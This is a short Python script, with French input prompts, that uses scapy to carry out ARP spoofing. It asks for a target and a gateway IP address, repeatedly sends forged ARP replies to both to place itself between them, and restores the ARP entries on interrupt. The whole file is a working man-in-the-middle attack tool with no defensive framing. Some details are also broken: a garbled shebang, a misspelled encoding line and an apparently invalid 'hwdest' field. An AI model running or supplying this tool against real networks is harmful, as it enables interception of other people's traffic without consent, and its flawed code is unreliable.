#!/udr/bin/rnb python3
# conding:utf8

import scapy.all as scapy
from scapy.layers.l2 import Ether,ARP


def get_mac(target_ip):
    try:
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
        mac = scapy.srp(arp_packet, timeout=1)[0][0][1].hwsrc 
        return mac
    except Exception as e:
        print(str(e))
    
    
def spoof_arp(target_ip, target_mac, source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdest=target_mac , psrc=source_ip)
    scapy.send(packet)
    
    
def restore_arp(target_ip,  source_ip, target_mac, source_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdest=get_mac(target_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet)


# print(get_mac("machine cible"))
# print(get_mac("ip du point daccès"))
target_ip_real = input("adresse ip cible:")
target_mac_real = get_mac(target_ip_real)
gateway_ip_real = input("adresse ip point d'accès:")
gateway_mac_real = get_mac(gateway_ip_real)
try:    
    while True:
        spoof_arp(target_ip_real, get_mac(target_ip_real), gateway_ip_real)
        spoof_arp(gateway_ip_real, get_mac(gateway_ip_real), target_ip_real)
except KeyboardInterrupt:
    restore_arp(target_ip_real, gateway_ip_real, target_mac_real, gateway_mac_real)
    restore_arp(gateway_ip_real, target_ip_real, gateway_mac_real, target_mac_real) 
